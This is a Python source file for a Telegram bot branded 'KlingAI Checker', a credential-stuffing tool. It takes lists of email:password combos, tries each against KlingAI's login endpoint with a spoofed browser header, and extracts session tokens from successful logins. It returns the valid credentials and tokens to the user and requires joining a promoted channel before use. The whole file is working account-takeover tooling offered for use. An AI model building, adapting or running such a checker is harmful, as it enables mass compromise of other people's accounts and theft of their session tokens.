import os
import aiohttp
import asyncio
from urllib.parse import quote
from datetime import datetime
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)


TOKEN = "your bot"  
CHANNEL_USERNAME = "@allthisme" 
CHANNEL_LINK = "https://t.me/allthisme"  
MAX_COMBOS = 200  


BRAND_NAME = "üîí KlingAI Checker"
BRAND_CREDIT = "Checked by https://t.me/allthisme"

async def check_klingai(email, password):
    """Check single KlingAI account"""
    try:
        encoded_email = quote(email)
        url = "https://id.klingai.com/pass/ksi18n/web/login/emailPassword"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        data = f"sid=ksi18n.ai.portal&email={encoded_email}&password={password}&sessionId=&language=en"
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, data=data, timeout=15) as response:
                response_text = await response.text()
                
                if "Account doesn't exist or wrong password" in response_text:
                    return False, None
                else:
                    try:
                        start = response_text.find('"ksi18n.ai.portal_st":"') + 23
                        end = response_text.find('",', start)
                        session_token = response_text[start:end] if start > 22 and end > start else None
                        return True, session_token
                    except:
                        return True, None
    except Exception as e:
        print(f"Error checking {email}: {str(e)}")
        return False, None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Join Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("‚úÖ I've Joined", callback_data="verify_join")]
    ]
    await update.message.reply_text(
        f"‚ú® *{BRAND_NAME}* ‚ú®\n\n"
        "üîë *Send me:*\n"
        "- A file with `email:password` combos\n"
        "- Or type `email:password` directly\n\n"
        "‚ö†Ô∏è *You must join our channel first!*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if user joined the channel"""
    query = update.callback_query
    await query.answer()
    
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, query.from_user.id)
        if member.status in ["member", "administrator", "creator"]:
            await query.edit_message_text(
                "‚úÖ *Access Granted!*\n\n"
                "Now you can:\n"
                "1. Send `email:password` directly\n"
                "2. Upload a file with combos\n\n"
                f"{BRAND_CREDIT}",
                parse_mode="Markdown"
            )
        else:
            await query.answer("You haven't joined the channel yet!", show_alert=True)
    except Exception as e:
        await query.answer("Error verifying membership!", show_alert=True)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process direct email:password messages"""
    # Verify channel membership first
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, update.effective_user.id)
        if member.status not in ["member", "administrator", "creator"]:
            await update.message.reply_text("‚ùå Please join our channel first!")
            return
    except Exception as e:
        await update.message.reply_text("‚ùå Couldn't verify channel membership!")
        return

    text = update.message.text.strip()
    if ":" not in text:
        await update.message.reply_text("‚ùå *Invalid Format!*\nUse: `email:password`", parse_mode="Markdown")
        return
    
    email, password = text.split(":", 1)
    msg = await update.message.reply_text(f"üîç Checking `{email}`...", parse_mode="Markdown")
    
    success, token = await check_klingai(email, password)
    if success:
        result = f"‚úÖ *Valid Account!*\n\n‚Ä¢ Email: `{email}`\n‚Ä¢ Password: `{password}`"
        if token:
            result += f"\n‚Ä¢ Token: `{token[:15]}...`"
    else:
        result = f"‚ùå *Invalid Account*\n\n`{email}:{password}`"
    
    await msg.edit_text(result, parse_mode="Markdown")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process uploaded files"""
    # Verify channel membership first
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, update.effective_user.id)
        if member.status not in ["member", "administrator", "creator"]:
            await update.message.reply_text("‚ùå Please join our channel first!")
            return
    except Exception as e:
        await update.message.reply_text("‚ùå Couldn't verify channel membership!")
        return

    try:
        # Download file
        file = await update.message.document.get_file()
        filename = f"combos_{update.effective_user.id}.txt"
        await file.download_to_drive(filename)
        
        # Read combos
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f.readlines() if ":" in line]
        
        os.remove(filename)  # Clean up
        
        if not lines:
            await update.message.reply_text("‚ùå No valid combos found in file!")
            return
            
        if len(lines) > MAX_COMBOS:
            await update.message.reply_text(f"‚ùå Too many combos! Max {MAX_COMBOS} allowed")
            return

        # Process combos
        valid_accounts = []
        progress_msg = await update.message.reply_text(f"‚è≥ Checking {len(lines)} accounts...")
        
        for i, line in enumerate(lines, 1):
            email, password = line.split(":", 1)
            success, token = await check_klingai(email, password)
            
            if success:
                if token:
                    valid_accounts.append(f"{email}:{password} | Token: {token}")
                else:
                    valid_accounts.append(f"{email}:{password}")
                
            if i % 5 == 0 or i == len(lines):  # Update progress
                await progress_msg.edit_text(
                    f"üîç Checked {i}/{len(lines)} | ‚úÖ Valid: {len(valid_accounts)}"
                )

        # Prepare results
        if valid_accounts:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_file = f"KlingAI_Valid_{timestamp}.txt"
            
            with open(result_file, 'w', encoding='utf-8') as f:
                f.write(f"‚úÖ Valid Accounts: {len(valid_accounts)}/{len(lines)}\n")
                f.write(f"üìÖ {timestamp}\n")
                f.write(f"{BRAND_CREDIT}\n\n")
                f.write("\n".join(valid_accounts))
            
            # Send results
            with open(result_file, 'rb') as f:
                await update.message.reply_document(
                    document=InputFile(f),
                    caption=f"üîë Found {len(valid_accounts)} valid accounts\n{BRAND_CREDIT}",
                    parse_mode="Markdown"
                )
            
            os.remove(result_file)  # Clean up
        else:
            await update.message.reply_text(f"‚ùå No valid accounts found in {len(lines)} combos")

    except Exception as e:
        await update.message.reply_text(f"‚ùå Error: {str(e)}")
        if 'filename' in locals() and os.path.exists(filename):
            os.remove(filename)

async def main():
    """Start the bot"""
    # Create the Application with explicit job queue disabled
    try:
        application = (Application.builder()
                      .token(TOKEN)
                      .job_queue(None)  # Disable job queue to avoid weak reference issues
                      .build())
    except Exception as e:
        print(f"Error creating application: {e}")
        # Fallback method
        from telegram.ext import ApplicationBuilder
        application = ApplicationBuilder().token(TOKEN).job_queue(None).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(verify_join, pattern="^verify_join$"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    print("ü§ñ Bot is running...")
    await application.initialize()
    await application.start()
    
    # Start polling
    await application.updater.start_polling()
    
    # Keep the bot running
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\nüõë Bot stopped")
        await application.stop()

if __name__ == '__main__':
    # Install required packages if not already installed
    try:
        import aiohttp
        import telegram
    except ImportError:
        import sys
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7", "aiohttp"])
        import aiohttp
        import telegram
    
    # Run the bot
    asyncio.run(main())